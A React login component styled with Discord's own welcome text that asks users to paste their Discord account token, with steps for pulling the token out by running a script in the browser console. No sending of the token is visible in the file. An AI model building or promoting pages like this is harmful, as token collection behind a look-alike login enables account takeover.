import React, { useState } from 'react';
import { Shield, Eye, EyeOff, AlertCircle } from 'lucide-react';
import discordService from '../services/discordService';

interface AuthComponentProps {
  onAuthenticated: () => void;
}

const AuthComponent: React.FC<AuthComponentProps> = ({ onAuthenticated }) => {
  const [token, setToken] = useState('');
  const [showToken, setShowToken] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [isValidToken, setIsValidToken] = useState(false);

  const handleTokenChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setToken(value);
    setIsValidToken(discordService.isTokenValid(value));
    setError('');
  };

  const handleAuthenticate = async () => {
    if (!isValidToken) {
      setError('Please enter a valid Discord token');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      const success = await discordService.authenticate(token);
      if (success) {
        onAuthenticated();
      } else {
        setError('Authentication failed. Please check your token.');
      }
    } catch (error) {
      setError('Authentication failed. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && isValidToken && !isLoading) {
      handleAuthenticate();
    }
  };

  return (
    <div className="min-h-screen bg-discord-darkest flex items-center justify-center">
      {/* Clean Login Page - No Sidebars */}
      <div className="w-full max-w-md mx-auto p-8">
        {/* App Logo */}
        <div className="text-center mb-8">
          <div className="w-24 h-24 bg-gradient-to-br from-discord-primary to-discord-secondary rounded-full flex items-center justify-center mx-auto mb-6">
            <Shield className="w-12 h-12 text-white" />
          </div>
          <h1 className="text-4xl font-bold text-discord-text mb-2">Welcome Back!</h1>
          <p className="text-xl text-discord-textMuted">We're so excited to see you again!</p>
        </div>

        {/* Login Form */}
        <div className="discord-card">
          <div className="text-center mb-6">
            <h2 className="text-2xl font-bold text-discord-text">Login to Discord</h2>
          </div>

          <div className="space-y-4">
            <div>
              <label htmlFor="token" className="block text-sm font-medium text-discord-text mb-2">
                Discord Token
              </label>
              <div className="relative">
                <input
                  id="token"
                  type={showToken ? 'text' : 'password'}
                  value={token}
                  onChange={handleTokenChange}
                  onKeyPress={handleKeyPress}
                  placeholder="Enter your Discord token"
                  className={`discord-input w-full pr-12 text-lg ${
                    token && !isValidToken ? 'border-discord-danger' : ''
                  }`}
                  disabled={isLoading}
                />
                <button
                  type="button"
                  onClick={() => setShowToken(!showToken)}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-discord-textMuted hover:text-discord-text transition-colors"
                  disabled={isLoading}
                >
                  {showToken ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
              {token && !isValidToken && (
                <p className="text-sm text-discord-danger mt-2 flex items-center">
                  <AlertCircle className="w-4 h-4 mr-2" />
                  Invalid token format
                </p>
              )}
            </div>

            {error && (
              <div className="bg-discord-danger/20 border border-discord-danger rounded-lg p-4">
                <p className="text-sm text-discord-danger flex items-center">
                  <AlertCircle className="w-5 h-5 mr-2" />
                  {error}
                </p>
              </div>
            )}

            <button
              onClick={handleAuthenticate}
              disabled={!isValidToken || isLoading}
              className={`w-full discord-button text-lg py-4 ${
                !isValidToken || isLoading
                  ? 'opacity-50 cursor-not-allowed'
                  : ''
              }`}
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-3"></div>
                  Logging in...
                </div>
              ) : (
                'Login'
              )}
            </button>

            <div className="text-center">
              <p className="text-sm text-discord-textMuted">
                Don't have an account?{' '}
                <a href="https://discord.com/register" target="_blank" rel="noopener noreferrer" className="text-discord-primary hover:underline">
                  Sign up
                </a>
              </p>
            </div>
          </div>
        </div>

        {/* Token Help */}
        <div className="mt-8 p-6 bg-discord-dark border border-discord-lighter rounded-lg">
          <h3 className="text-lg font-semibold text-discord-text mb-4 flex items-center">
            <AlertCircle className="w-5 h-5 mr-2 text-discord-warning" />
            How to get your Discord token:
          </h3>
          <ol className="text-sm text-discord-textMuted space-y-2 list-decimal list-inside">
            <li>Open Discord in your browser</li>
            <li>Press F12 to open Developer Tools</li>
            <li>Go to the Console tab</li>
            <li>Type the Discord token extraction script</li>
            <li>Press Enter and copy the token</li>
          </ol>
          <div className="mt-4 p-3 bg-discord-danger/20 border border-discord-danger rounded">
            <p className="text-xs text-discord-danger flex items-center">
              <AlertCircle className="w-4 h-4 mr-2" />
              ⚠️ Keep your token secret and never share it with anyone!
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AuthComponent;
